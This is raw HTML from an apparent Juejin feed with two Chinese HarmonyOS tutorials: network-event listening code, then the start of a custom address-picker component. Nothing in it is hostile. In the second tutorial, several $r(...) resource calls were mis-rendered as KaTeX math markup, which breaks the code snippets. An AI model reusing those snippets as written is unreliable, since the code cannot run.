    logger.<span class="hljs-title function_">info</span>(<span class="hljs-string">"NetUtils"</span>, <span class="hljs-string">"NetType :"</span> + netType + <span class="hljs-string">", network netBlockStatusChange "</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">postEvent</span>(<span class="hljs-title class_">NetworkEventName</span>.<span class="hljs-property">NetBlock</span>, data, netType)
  });
 
  netConnection.<span class="hljs-title function_">on</span>(<span class="hljs-string">'netConnectionPropertiesChange'</span>, <span class="hljs-function">(<span class="hljs-params">data: connection.NetConnectionPropertyInfo</span>) =&gt;</span> {
    logger.<span class="hljs-title function_">info</span>(<span class="hljs-string">"NetUtils"</span>, <span class="hljs-string">"NetType :"</span> + netType + <span class="hljs-string">", network netConnectionPropertiesChange "</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">postEvent</span>(<span class="hljs-title class_">NetworkEventName</span>.<span class="hljs-property">NetConnectionPropertiesChange</span>, data, netType);
  });

  <span class="hljs-comment">// 订阅网络丢失事件，当网络严重中断或正常断开时触发该事件</span>
  <span class="hljs-comment">// 网络丢失是指网络严重中断或正常断开事件，当断开Wi-Fi时，是属于正常断开网络连接，会触发netLost事件</span>
  netConnection.<span class="hljs-title function_">on</span>(<span class="hljs-string">'netLost'</span>, <span class="hljs-function">(<span class="hljs-params">data: connection.NetHandle</span>) =&gt;</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">postEvent</span>(<span class="hljs-title class_">NetworkEventName</span>.<span class="hljs-property">NetLost</span>, <span class="hljs-literal">true</span>, netType)
    logger.<span class="hljs-title function_">info</span>(<span class="hljs-string">"NetUtils"</span>, <span class="hljs-string">"NetType :"</span> + netType + <span class="hljs-string">", Succeeded to get netLost: "</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
  });
 
  <span class="hljs-comment">// 订阅网络不可用事件，当网络不可用时触发该事件</span>
  <span class="hljs-comment">// 网络不可用是指网络不可用事件，当连接的网络不能使用时，会触发netUnavailable事件。</span>
  netConnection.<span class="hljs-title function_">on</span>(<span class="hljs-string">'netUnavailable'</span>, <span class="hljs-function">() =&gt;</span> {
    logger.<span class="hljs-title function_">info</span>(<span class="hljs-string">"NetUtils"</span>, <span class="hljs-string">"NetType :"</span> + netType + <span class="hljs-string">", Succeeded to get unavailable net event"</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">postEvent</span>(<span class="hljs-title class_">NetworkEventName</span>.<span class="hljs-property">NetUnavailable</span>, <span class="hljs-literal">true</span>, netType);
  });
 
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">connectionMap</span>.<span class="hljs-title function_">set</span>(netType, netConnection);
}
</code></pre>
<p>2.4 通过emitter将网络监听状态传递给页面</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">private</span> postEvent(eventName: NetworkEventName, status: NetworkData, netType?: connection.NetBearType,
  priority?: emitter.EventPriority) {
  <span class="hljs-keyword">this</span>.emitterEvent.priority = priority;
  emitter.emit(<span class="hljs-keyword">this</span>.emitterEvent, {
    <span class="hljs-keyword">data</span>: new NetEventData(eventName, status, netType)
  })
}
</code></pre>
</li>
</ol>
<h4 data-id="heading-3">如果您想系统深入地学习 HarmonyOS 开发或想考取HarmonyOS认证证书，欢迎加入华为开发者学堂：</h4>
<h3 data-id="heading-4">请点击→： <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Ftraining%2FclassDetail%2Fd0d15d9039414a8fad9f99ac4a3f5096%3Ftype%3D1%253Fha_source%253Dhmosclass%26ha_sourceId%3D89000248" target="_blank" title="https://developer.huawei.com/consumer/cn/training/classDetail/d0d15d9039414a8fad9f99ac4a3f5096?type=1%3Fha_source%3Dhmosclass&amp;ha_sourceId=89000248" ref="nofollow noopener noreferrer">HarmonyOS官方认证培训</a></h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d54702fb8d074dc2a2b06575780f37d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767622611&amp;x-signature=lc7tYLQmSCqI1P8SHK3DES7nsmE%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HarmonyOS应用开发：自定义地址选择组件]]></title>    <link>https://juejin.cn/post/7589082912588841003</link>    <guid>https://juejin.cn/post/7589082912588841003</guid>    <pubDate>2025-12-29T14:20:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589082912588841003" data-draft-id="7589099845186797604" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HarmonyOS应用开发：自定义地址选择组件"/> <meta itemprop="keywords" content="HarmonyOS,程序员,Android"/> <meta itemprop="datePublished" content="2025-12-29T14:20:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="鹿人戛"/> <meta itemprop="url" content="https://juejin.cn/user/4309685005226376"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HarmonyOS应用开发：自定义地址选择组件
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4309685005226376/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    鹿人戛
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:20:05.000Z" title="Mon Dec 29 2025 14:20:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">前言</h3>
<p>本示例介绍如何使用bindSheet，changeIndex，onAreaChange实现带切换动效的自定义地址选择组件。</p>
<h3 data-id="heading-1">效果图预览</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25281b5679ca4dfb8b95975c42c6c242~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767622805&amp;x-signature=XR327%2B7myHIYxuuYifGQ8IE8hJE%3D" alt="" loading="lazy"/></p>
<p><strong>使用说明</strong></p>
<ol>
<li>
<p>进入页面，点击场景一中“所在地区”一栏，可拉起省市区的地址选择弹窗。选择完区后，弹窗自动关闭，“所在地区”一栏显示当前选择的省市区名。</p>
</li>
<li>
<p>进入页面，点击场景二中的'获取地址信息'按钮，可以查看省市区名和相应的id。点击“所在地区”一栏，在拉起的地址选择弹窗里选择另一个省市区后，再次点击'获取地址信息'按钮，会显示最新选择的省市区的信息。</p>
</li>
</ol>
<h3 data-id="heading-2">实现思路</h3>
<ol>
<li>
<p>使用getRawFileContentSync从rawfile目录下读取省市区json文件数据，使用util.TextDecoder进行解码。</p>
<p>getAddressData(): Array {
// 从rawfile本地json文件中获取数据
const value = getContext().resourceManager.getRawFileContentSync(this.jsonFileDir);
// 解码为utf-8格式
const textDecoder = util.TextDecoder.create('utf-8', { ignoreBOM: true });
const textDecoderResult = textDecoder.decodeToString(new Uint8Array(value.buffer));
const jsonObj: JsonObjType = JSON.parse(textDecoderResult) as JsonObjType;
const modelBuckets: Array = [];
// 映射json数据为model对象
const modelObj = jsonObj.addressList;
for (let i = 0; i &lt; modelObj.length; i++) {
const contactTemp = new Province(modelObj[i].code, modelObj[i].name, modelObj[i].children);
// 从json中读取每个省数据写入modelBuckets
modelBuckets.push(contactTemp);
}
return modelBuckets;
}</p>
</li>
<li>
<p>使用bindSheet绑定地址选择半模态弹窗页面。</p>
<p>Row() {
// ...
}
.width(<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><msup><mo stretchy="false">(</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>a</mi><mi>p</mi><mi>p</mi><mi mathvariant="normal">.</mi><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi><mi mathvariant="normal">.</mi><mi>c</mi><mi>u</mi><mi>s</mi><mi>t</mi><mi>o</mi><msub><mi>m</mi><mi>a</mi></msub><mi>d</mi><mi>d</mi><mi>r</mi><mi>e</mi><mi>s</mi><msub><mi>s</mi><mi>p</mi></msub><mi>i</mi><mi>c</mi><mi>k</mi><mi>e</mi><msub><mi>r</mi><mi>f</mi></msub><mi>u</mi><mi>l</mi><msub><mi>l</mi><mi>s</mi></msub><mi>i</mi><mi>z</mi><msup><mi>e</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi><mi>h</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">r('app.string.custom_address_picker_full_size'))
.height(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.038em;vertical-align:-0.2861em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen"><span class="mopen">(</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mord mathnormal">pp</span><span class="mord">.</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">in</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord">.</span><span class="mord mathnormal">c</span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord mathnormal">dd</span><span class="mord mathnormal">res</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mord mathnormal">i</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0197em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">))</span><span class="mord">.</span><span class="mord mathnormal">h</span><span class="mord mathnormal">e</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">h</span><span class="mord mathnormal">t</span><span class="mopen">(</span></span></span></span></span>r('app.float.custom_address_picker_size_forty_eight'))
.onClick(() =&gt; {
// 显示地址选择半模态弹窗页面
this.isShow = true;
this.currentIndex = AddressType.Province;
})
.bindSheet($$this.isShow, this.addressSelectPage(), {
height: $r('app.string.custom_address_picker_percent_seventy'), // 半模态弹窗高度
showClose: false, // 设置不显示自带的关闭图标
dragBar: false,
onDisappear: () =&gt; {
// 退出地址选择半模态弹窗页面时，重置相关参数
this.animationDuration = 0;
// 如果当前省市区没选全，则清空当前选择的地址信息
if (this.currentSelectInfo.region === '') {
this.currentSelectInfo.provinceId = '';
this.currentSelectInfo.cityId = '';
this.currentSelectInfo.regionId = '';
this.currentSelectInfo.province = '';
this.currentSelectInfo.city = '';
this.currentSelectInfo.region = '';
this.cityList = [];
this.regionList = [];
}
}
})</p>
</li>
<li>
<p>使用changeIndex控制省市区列表TabContent切换。使用组件区域变化回调onAreaChange获取选择的省市区Text组件宽度，存入textInfos数组，用于后续计算选择省市区名后下方下滑线动画水平偏移量leftMargin。</p>
<p>Text(<code>${params.name === '' ? '请选择' : params.name} </code>)
.height(<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><msup><mo stretchy="false">(</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>a</mi><mi>p</mi><mi>p</mi><mi mathvariant="normal">.</mi><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi><mi mathvariant="normal">.</mi><mi>c</mi><mi>u</mi><mi>s</mi><mi>t</mi><mi>o</mi><msub><mi>m</mi><mi>a</mi></msub><mi>d</mi><mi>d</mi><mi>r</mi><mi>e</mi><mi>s</mi><msub><mi>s</mi><mi>p</mi></msub><mi>i</mi><mi>c</mi><mi>k</mi><mi>e</mi><msub><mi>r</mi><mi>f</mi></msub><mi>u</mi><mi>l</mi><msub><mi>l</mi><mi>s</mi></msub><mi>i</mi><mi>z</mi><msup><mi>e</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi><mi>f</mi><mi>o</mi><mi>n</mi><mi>t</mi><mi>S</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">r('app.string.custom_address_picker_full_size'))
  .fontSize(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.038em;vertical-align:-0.2861em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen"><span class="mopen">(</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mord mathnormal">pp</span><span class="mord">.</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">in</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord">.</span><span class="mord mathnormal">c</span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord mathnormal">dd</span><span class="mord mathnormal">res</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mord mathnormal">i</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0197em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">))</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.05764em;">tS</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mopen">(</span></span></span></span></span>r('app.float.custom_address_picker_size_sixteen'))
.fontWeight(this.currentIndex === params.index ? Constants.FONT_WEIGHT_FIVE_HUNDRED :
Constants.FONT_WEIGHT_FOUR_HUNDRED)
.fontColor(this.currentIndex === params.index ? <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><msup><mo stretchy="false">(</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>a</mi><mi>p</mi><mi>p</mi><mi mathvariant="normal">.</mi><mi>c</mi><mi>o</mi><mi>l</mi><mi>o</mi><mi>r</mi><mi mathvariant="normal">.</mi><mi>c</mi><mi>u</mi><mi>s</mi><mi>t</mi><mi>o</mi><msub><mi>m</mi><mi>a</mi></msub><mi>d</mi><mi>d</mi><mi>r</mi><mi>e</mi><mi>s</mi><msub><mi>s</mi><mi>p</mi></msub><mi>i</mi><mi>c</mi><mi>k</mi><mi>e</mi><msub><mi>r</mi><mi>f</mi></msub><mi>o</mi><mi>n</mi><msub><mi>t</mi><mi>c</mi></msub><mi>o</mi><mi>l</mi><mi>o</mi><msub><mi>r</mi><mi>b</mi></msub><mi>l</mi><mi>a</mi><mi>c</mi><msup><mi>k</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">r('app.color.custom_address_picker_font_color_black') :
  </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.038em;vertical-align:-0.2861em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen"><span class="mopen">(</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mord mathnormal">pp</span><span class="mord">.</span><span class="mord mathnormal">co</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.02778em;">or</span><span class="mord">.</span><span class="mord mathnormal">c</span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord mathnormal">dd</span><span class="mord mathnormal">res</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mord mathnormal">i</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing 